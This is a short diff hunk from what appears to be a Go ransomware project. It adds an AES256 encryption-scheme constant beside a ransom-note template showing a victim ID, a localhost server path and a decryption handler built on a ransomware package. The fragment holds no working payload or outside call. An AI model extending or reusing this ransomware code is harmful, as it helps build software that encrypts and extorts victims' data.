@@ -28,6 +28,7 @@ Your unique ID is: %s
 `
 
 const serverPath = "http://localhost:8080"
+const encryptionScheme crypt.EncryptionScheme = crypt.AES256
 
 func handleDecryptionProcess(rw *ransomware.Ransomware) {
 	if rw.CheckIfValidMemSafeKey() {
